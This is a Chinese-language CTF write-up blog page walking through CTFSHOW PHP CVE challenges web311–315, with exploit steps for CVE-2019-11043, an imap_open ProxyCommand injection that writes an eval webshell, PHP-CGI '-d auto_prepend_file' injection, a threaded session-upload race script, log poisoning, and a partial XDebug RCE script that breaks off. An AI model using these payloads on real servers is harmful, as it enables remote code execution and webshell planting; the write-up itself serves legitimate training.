<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><title>CTFSHOW | phpCVE题解 web311 - web315 - WayneJH Blog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="WayneJH Blog"><meta name="msapplication-TileImage" content="https://oss.waynejoons.icu/picphoto/favicon.ico"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="WayneJH Blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="Welcome to WayneJH Blog - CTF writeups and cybersecurity insights. Here you can learn a lot about cybersecurity knowledge"><meta property="og:type" content="blog"><meta property="og:title" content="CTFSHOW | phpCVE题解 web311 - web315"><meta property="og:url" content="https://waynejoon.github.io/posts/ctfshow-phpcve-web311-web315/"><meta property="og:site_name" content="WayneJH Blog"><meta property="og:description" content="Welcome to WayneJH Blog - CTF writeups and cybersecurity insights. Here you can learn a lot about cybersecurity knowledge"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://waynejoon.github.io/img/waynejoon.jpg"><meta property="article:published_time" content="2025-08-10T14:13:29.000Z"><meta property="article:modified_time" content="2025-11-10T04:10:59.634Z"><meta property="article:author" content="WayneJoon.H"><meta property="article:tag" content="CTFSHOW"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://waynejoon.github.io/img/waynejoon.jpg"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://waynejoon.github.io/posts/ctfshow-phpcve-web311-web315/"},"headline":"CTFSHOW | phpCVE题解 web311 - web315","image":["https://waynejoon.github.io/img/waynejoon.jpg"],"datePublished":"2025-08-10T14:13:29.000Z","dateModified":"2025-11-10T04:10:59.634Z","author":{"@type":"Person","name":"WayneJoon.H"},"publisher":{"@type":"Organization","name":"WayneJH Blog","logo":{"@type":"ImageObject","url":{"text":"WayneJH"}}},"description":"CTFSHOW phpCVE专题详细题解"}</script><link rel="canonical" href="https://waynejoon.github.io/posts/ctfshow-phpcve-web311-web315/"><link rel="icon" href="https://oss.waynejoons.icu/picphoto/favicon.ico"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="WayneJH Blog" type="application/atom+xml">
</head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/">WayneJH</a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">首页</a><a class="navbar-item" href="/archives">归档</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/links">友链</a><a class="navbar-item" href="/about">关于</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="GitHub" href="https://github.com/waynejoon"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2025-08-10T14:13:29.000Z" title="2025/8/10 22:13:29">2025-08-10</time>发表</span><span class="level-item"><a class="link-muted" href="/categories/CTFSHOW/">CTFSHOW</a></span><span class="level-item">21 分钟读完 (大约3198个字)</span><span class="level-item" id="busuanzi_container_page_pv" style="display:none"><span id="busuanzi_value_page_pv">--</span>次访问</span></div></div><h1 class="title is-3 is-size-4-mobile">CTFSHOW | phpCVE题解 web311 - web315</h1><div class="content"><h2 id="题目列表"><a href="#题目列表" class="headerlink" title="题目列表"></a>题目列表</h2><h3 id="web311"><a href="#web311" class="headerlink" title="web311"></a>web311</h3><p>打开题目环境，先看看题目使用了什么语言和服务，F12打开<strong>网络</strong>，或者用<strong>Wappalyer</strong>查看</p>
<p><img src="https://oss.waynejoons.icu/picphoto/20250810130549601.png"></p>
<p>可以看到目标环境为 Nginx + PHP-FPM，且PHP版本为7.1</p>
<p>上网搜索对应的漏洞，发现<strong>CVE-2019-11043</strong>符合我们的要求</p>
<p>具体可以参考链接：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1530703">https://cloud.tencent.com/developer/article/1530703</a></p>
<p><strong>漏洞描述</strong></p>
<p><strong>CVE-2019-11043</strong> 是一个重要的 PHP-FPM 远程代码执行漏洞，主要影响配置不当的 Nginx + PHP-FPM 网站，攻击者可利用该漏洞执行任意 PHP 代码，进而控制目标服务器</p>
<p>向Nginx + PHP-FPM的服务器 URL发送 %0a 时，服务器返回异常</p>
<p>该漏洞需要在nginx.conf中进行特定配置才能触发，具体配置如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">location ~ [^/]\.php(/|$) &#123;</span><br><span class="line"></span><br><span class="line"> ...</span><br><span class="line"></span><br><span class="line"> fastcgi_split_path_info ^(.+?\.php)(/.*)$;</span><br><span class="line"></span><br><span class="line"> fastcgi_param PATH_INFO $fastcgi_path_info;</span><br><span class="line"></span><br><span class="line"> fastcgi_pass   php:9000;</span><br><span class="line"></span><br><span class="line"> ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当用户在请求路径中插入编码为 <code>%0a</code> 的换行符，Nginx 的正则处理会使 <code>PATH_INFO</code> 为空。传递给 PHP-FPM 后，由于变量长度与内容可被精确控制，进而影响内存布局，使攻击者可构造特殊的 FastCGI 参数（如可控伪造 <code>PHP_VALUE</code>）</p>
<p><strong>影响范围</strong></p>
<p>在 Nginx + PHP-FPM 环境下，当启用了上述 Nginx 配置后，以下 PHP 版本受本次漏洞影响，另外，PHP 5.6版本也受此漏洞影响，但目前只能 Crash，不可以远程代码执行：</p>
<ul>
<li>PHP 7.0 </li>
<li>PHP 7.1 </li>
<li>PHP 7.2 </li>
<li>PHP 7.3</li>
</ul>
<p>这题要用到的工具是<code>phuip-fpizdam</code>，项目地址：<a target="_blank" rel="noopener" href="https://github.com/neex/phuip-fpizdam">https://github.com/neex/phuip-fpizdam</a></p>
<p>该工具是基于Go语言构建的，需要先搭建好环境</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#更新本地软件包</span><br><span class="line">apt-get update</span><br><span class="line"></span><br><span class="line">#安装Go</span><br><span class="line">apt install golang</span><br><span class="line"></span><br><span class="line">#验证</span><br><span class="line">go -version</span><br></pre></td></tr></table></figure>

<p>然后github下载工具</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#克隆项目到本地</span><br><span class="line">git clone https://github.com/neex/phuip-fpizdam.git</span><br><span class="line"></span><br><span class="line">#进入工具目录</span><br><span class="line">cd phuip-fpizdam</span><br><span class="line"></span><br><span class="line">#获取依赖包和编译代码</span><br><span class="line">go get -v &amp;&amp; go build</span><br></pre></td></tr></table></figure>

<p><img src="https://oss.waynejoons.icu/picphoto/20250810142707385.png"></p>
<p>然后使用工具执行命令，地址换成自己的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go run . <span class="string">&quot;http://d654f5bf-2024-4d68-a045-c216dba47a44.challenge.ctf.show/index.php&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://oss.waynejoons.icu/picphoto/20250810143609055.png"></p>
<p>最后返回题目，在<code>/index.php?a=</code>执行命令即可，如果没反应就多执行几次</p>
<p><img src="https://oss.waynejoons.icu/picphoto/20250810143839197.png"></p>
<p>flag在<code>fl0gHe1e.txt</code>里面，执行<code>/index.php?a=cat fl0gHe1e.txt</code>即可</p>
<p><img src="https://oss.waynejoons.icu/picphoto/20250810143935819.png"></p>
<h3 id="web312"><a href="#web312" class="headerlink" title="web312"></a>web312</h3><p>打开题目，可以看到一个邮箱登录框</p>
<p><img src="https://oss.waynejoons.icu/picphoto/20250810160427800.png"></p>
<p>目标环境为Nginx和PHP5.6.38</p>
<p><img src="https://oss.waynejoons.icu/picphoto/20250810160719779.png"></p>
<p>网上搜索一番，发现<strong>CVE-2018-19518</strong>符合我们的要求</p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45605352/article/details/116517889">https://blog.csdn.net/weixin_45605352/article/details/116517889</a></p>
<p><strong>什么是IMAP</strong></p>
<p>IMAP（Internet Message Access Protocol，互联网邮件访问协议）是一种用于从邮件服务器远程访问和管理电子邮件的标准协议。与传统的POP3不同，IMAP允许用户在多个设备上同步邮箱状态，邮件内容保留在服务器上，用户对邮件的操作如读取、删除都会实时反馈到服务器，便于多设备协同管理邮箱，实现更灵活和在线的邮件访问体验，通常端口是143</p>
<p><strong>漏洞描述</strong></p>
<p><strong>CVE-2018-19518</strong>是PHP IMAP远程命令执行漏洞，漏洞存在于PHP IMAP扩展的<code>imap_open()</code>函数，该函数用于连接IMAP邮件服务器，受到影响的环境通常运行在类Unix系统上，PHP通过<code>imap_open</code>连接远程IMAP服务时会调用底层<code>rsh</code>命令尝试连接</p>
<p><strong>漏洞成因</strong></p>
<p><code>imap_open()</code>函数中，IMAP服务器名称作为参数传递给<code>rsh</code>（远程shell）命令，在部分系统中，<code>rsh</code>命令被替换为<code>ssh</code>（比如Debian、Ubuntu），而ssh支持更多复杂的命令参数。攻击者可以在构造的IMAP服务器名称中注入<code>-oProxyCommand=</code>参数，这些参数被<code>ssh</code>解释执行，从而执行任意系统命令</p>
<p><code>imap_open(string $mailbox , string $username , string $password)</code>函数中的<code>mailbox</code>是执行命令参数的一部分，所以我们可以通过更改邮箱名来进行命令注入执行</p>
<p><strong>影响范围</strong></p>
<p>漏洞影响PHP多个版本，包括5.6.0至5.6.38，7.0.0至7.0.32，7.1.0至7.1.24，7.2.0至7.2.12等版本</p>
<p>现在回到题目，先随便输入几个数，看看表单数据</p>
<p><img src="https://oss.waynejoons.icu/picphoto/20250810164512552.png"></p>
<p>可以看到这里POST上传了三个参数，因为<code>imap_open(string $mailbox , string $username , string $password)</code>函数中的<code>mailbox</code>是执行命令参数的一部分，所以我们可以通过更改它来进行命令注入执行</p>
<p>原始payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x+-oProxyCommand=echo	echo &#x27;&lt;?php eval($_POST[1]);&#x27; &gt; /var/www/html/1.php|base64	-d|sh&#125;</span><br></pre></td></tr></table></figure>

<p>对内容进行base64编码，符号进行URL编码，%3d是等号，%09是制表符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x+-oProxyCommand%3decho%09ZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pOycgPiAvdmFyL3d3dy9odG1sLzEucGhw%3d|base64%09-d|sh&#125;</span><br></pre></td></tr></table></figure>

<p>最终payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hostname=x+-oProxyCommand%3decho%09ZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pOycgPiAvdmFyL3d3dy9odG1sLzEucGhw%3d|base64%09-d|sh&#125;&amp;username=111&amp;password=222</span><br></pre></td></tr></table></figure>

<p><img src="https://oss.waynejoons.icu/picphoto/20250810165930582.png"></p>
<p>显示下面结果即为成功</p>
<p><img src="https://oss.waynejoons.icu/picphoto/20250810170210991.png"></p>
<p>然后蚁剑连接webshell</p>
<p><img src="https://oss.waynejoons.icu/picphoto/20250810170321097.png"></p>
<p>成功找到flag</p>
<p><img src="https://oss.waynejoons.icu/picphoto/20250810170351080.png"></p>
<h3 id="web313"><a href="#web313" class="headerlink" title="web313"></a>web313</h3><p>打开题目，先看看目标环境</p>
<p><img src="https://oss.waynejoons.icu/picphoto/20250810183728081.png"></p>
<p>也是Nginx + PHP，且PHP版本为5.4.1，上网搜索对应可能的漏洞，发现<strong>CVE-2012-1823</strong>符合我们的要求</p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/lthlsy/p/14820076.html">https://www.cnblogs.com/lthlsy/p/14820076.html</a></p>
<p><strong>漏洞描述</strong></p>
<p><strong>CVE-2012-1823</strong> 是 PHP-CGI 远程代码执行漏洞，主要出现在 PHP-CGI 模式下。该模式下 PHP 响应 HTTP 请求的方式存在缺陷，导致攻击者能够通过特别构造的 URL 参数，动态修改 PHP 的运行时配置</p>
<p><strong>漏洞成因</strong></p>
<p>漏洞来源于 PHP-CGI 对命令行参数的处理不严谨，攻击者可以在 URL 中插入以 <code>-d</code> 开头的参数（如 <code>-d allow_url_include=1 -d auto_prepend_file=php://input</code>），这些参数本应只由命令行传递，却被 PHP-CGI 错误地解析为运行配置。这就允许攻击者开启危险功能，或通过指定 <code>auto_prepend_file</code> 使 PHP 在执行时读取并执行 HTTP 请求体中的恶意代码，从而实现远程执行任意 PHP 代码</p>
<p><strong>影响范围</strong></p>
<p>该漏洞影响 <strong>PHP 5.3.x 和 5.4.x</strong> 的早期版本（PHP &lt; 5.3.12 ，PHP &lt; 5.4.2），尤其是在使用 CGI 模式处理请求的环境中更易受害。生产环境中，许多使用 Nginx 反向代理 PHP-CGI 的站点因未做适当配置而成为攻击目标</p>
<p>CGI模式下有如下可控命令行参数可用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-c 指定php.ini文件的位置</span><br><span class="line"></span><br><span class="line">-n 不要加载php.ini文件</span><br><span class="line"></span><br><span class="line">-d 指定配置项</span><br><span class="line"></span><br><span class="line">-b 启动fastcgi进程</span><br><span class="line"></span><br><span class="line">-s 显示文件源码</span><br><span class="line"></span><br><span class="line">-T 执行指定次该文件</span><br><span class="line"></span><br><span class="line">-h和-? 显示帮助</span><br></pre></td></tr></table></figure>

<p>可以用<code>-s</code>显示文件源码</p>
<p><img src="https://oss.waynejoons.icu/picphoto/20250810185825819.png"></p>
<p>证明确实存在该漏洞，接下来就是执行payload了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?-d+allow_url_include=1+-d+auto_prepend_file=php://input</span><br></pre></td></tr></table></figure>

<p>URL编码，%3d是等号，%3a是冒号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp%3a//input</span><br></pre></td></tr></table></figure>

<p>然后请求体写PHP代码执行命令</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://oss.waynejoons.icu/picphoto/20250810190757565.png"></p>
<p>最后在<code>/somewhere</code>找到flag</p>
<p><img src="https://oss.waynejoons.icu/picphoto/20250810190931134.png"></p>
<h3 id="web314"><a href="#web314" class="headerlink" title="web314"></a>web314</h3><p>打开题目，可以看到给出了源码，但是由于禁了冒号，没办法用伪协议</p>
<p><img src="https://oss.waynejoons.icu/picphoto/20250810200507829.png"></p>
<p>可以正常读取文件</p>
<p><img src="https://oss.waynejoons.icu/picphoto/20250810200930152.png"></p>
<p>扫描目录，发现有个<code>/phpinfo.php</code>，题目里的源码注释也有提示</p>
<p><img src="https://oss.waynejoons.icu/picphoto/20250810201944197.png"></p>
<p>拼接进URL访问，发现开启了session，且<strong>session.name</strong>为PHPSESSID</p>
<p><img src="https://oss.waynejoons.icu/picphoto/20250810202501457.png"></p>
<p>可以用<code>PHP_SESSION_UPLOAD_PROGRESS</code>进行文件包含，用到条件竞争</p>
<p>payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://b14a333f-6a35-4dea-b3e3-d016a1f023b2.challenge.ctf.show/&#x27;</span></span><br><span class="line">file_name=<span class="string">&quot;/var/www/html/1.php&quot;</span></span><br><span class="line">file_content=<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">f&quot;&lt;?php echo &#x27;success!&#x27;; file_put_contents(&#x27;<span class="subst">&#123;file_name&#125;</span>&#x27;,&#x27;<span class="subst">&#123;file_content&#125;</span>&#x27;);?&gt;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>)</span><br><span class="line">        session.post(url,cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;hello&#x27;</span>&#125;,data=data,files=&#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;xxx&#x27;</span>,f)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        response = session.post(url+<span class="string">&#x27;?f=/tmp/sess_hello&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;success!&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;写入成功，访问1.php getshell&quot;</span>)</span><br><span class="line">            event.clear()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br></pre></td></tr></table></figure>

<p>显示写入成功即可</p>
<p><img src="https://oss.waynejoons.icu/picphoto/20250810203046230.png"></p>
<p>蚁剑连接webshell</p>
<p><img src="https://oss.waynejoons.icu/picphoto/20250810203155406.png"></p>
<p>在根目录成功找到flag</p>
<p><img src="https://oss.waynejoons.icu/picphoto/20250810203220900.png"></p>
<p>还有一个方法就是<strong>用UA头进行日志文件包含</strong></p>
<p>URL拼接参数<code>?f=/var/log/nginx/access.log</code>，然后UA头写入<code>&lt;?php eval($_POST[1]);?&gt;</code>，最后Body写入命令POST发送执行即可</p>
<p><img src="https://oss.waynejoons.icu/picphoto/20250810204813065.png"></p>
<p>执行命令得到flag</p>
<p><img src="https://oss.waynejoons.icu/picphoto/20250810205435637.png"></p>
<h3 id="web315"><a href="#web315" class="headerlink" title="web315"></a>web315</h3><p>题目提示debug开启，端口9000</p>
<p>上网搜了一下对应漏洞，发现<strong>XDebug 远程调试漏洞</strong>符合我们的要求</p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/zy15667076526/article/details/111824491">https://blog.csdn.net/zy15667076526/article/details/111824491</a></p>
<p><strong>XDebug 远程调试漏洞</strong>是一种因XDebug扩展的远程调试功能配置不当而引发的严重安全风险。XDebug是PHP的一个调试扩展，主要帮助开发者远程调试PHP代码，比如通过IDE连接服务器进行代码断点调试。当XDebug开启远程调试且配置了<code>xdebug.remote_connect_back=1</code>（或在新版XDebug中对应的<code>xdebug.discover_client_host=1</code>），XDebug会自动尝试连接发起HTTP请求客户端的IP地址以建立调试会话</p>
<p>这个自动“回连”机制如果暴露在公网环境中，我们访问<code>http://target/index.php?XDEBUG_SESSION_START=phpstorm</code>，目标服务器的XDebug将会连接访问者的IP（或X-Forwarded-For头指定的地址）。连接建立后，攻击者可以通过调试协议(DBGp)主动执行PHP代码，利用该功能中的eval接口实现任意代码执行（RCE）。由于XDebug调试协议没有身份验证，攻击者几乎可以完全控制运行PHP代码的服务器进程</p>
<p>我们可以输入<code>/index.php?XDEBUG_SESSION_START=phpstorm</code>验证一下</p>
<p><img src="https://oss.waynejoons.icu/picphoto/20250810212351291.png"></p>
<p>响应头中出现了 <code>Set-Cookie: XDEBUG_SESSION=phpstorm</code>，这表示服务器上的 PHP 在启用了 XDebug 调试扩展，并且远程调试功能被激活了，因此可以判断漏洞存在</p>
<p>这个漏洞的利用要用到脚本，可以命名为<code>exp.py</code></p>
<p>payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">logging.basicConfig(stream=sys.stdout, level=logging.INFO, <span class="built_in">format</span>=<span class="string">&#x27;%(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line">server_done = threading.Event()</span><br><span class="line">server_started = threading.Event()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_xml</span>(<span class="params">sock: socket.socket</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    blocks = []</span><br><span class="line">    data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = data + sock.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> data:</span><br><span class="line">            eop = data.find(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> eop &lt; <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            blocks.append(data[:eop])</span><br><span class="line">            data = data[eop+<span class="number">1</span>:]</span><br><span 